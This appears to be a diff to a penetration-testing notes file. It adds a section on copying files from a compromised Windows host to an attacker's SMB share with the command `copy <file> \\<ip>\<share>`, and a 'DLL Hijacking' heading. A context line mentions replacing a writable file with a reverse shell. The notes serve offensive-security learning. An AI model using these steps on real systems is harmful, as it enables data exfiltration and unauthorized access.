@@ -715,9 +715,18 @@ Management Users can access it with WinRM.
 
 - We have write access to the file,I exploited it by copying a revshell to replace it.
 
+---------------
+
+### Copying files to the attack machine
+
+- Use
+
+`copy <file> \\<ip>\<share>`
+
+![image](https://github.com/user-attachments/assets/54e50dd4-507b-49c2-a60a-3a17484183ac)
 
 
-
+### DLL Hijacking
 
 
 
